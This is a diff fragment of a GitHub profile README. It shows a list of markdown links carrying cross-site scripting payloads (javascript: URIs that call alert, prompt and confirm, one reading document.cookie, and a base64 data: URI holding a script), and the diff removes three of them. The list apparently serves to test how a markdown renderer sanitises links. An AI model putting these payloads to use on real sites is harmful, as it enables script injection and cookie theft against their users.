@@ -40,10 +40,6 @@ hello [hack](javascript:javascript:alert('xss'))
 [XSS](javascript://www.google.com%0Aprompt(1))
 [XSS](javascript://%0d%0aconfirm(1);com)
 [XSS](javascript:window.onerror=confirm;throw%201)
-[XSS](�javascript:alert(document.domain&#41;)
-![XSS](javascript:prompt(document.cookie))\
-![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
-
 
 <!--
 **blackb1rd/blackb1rd** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
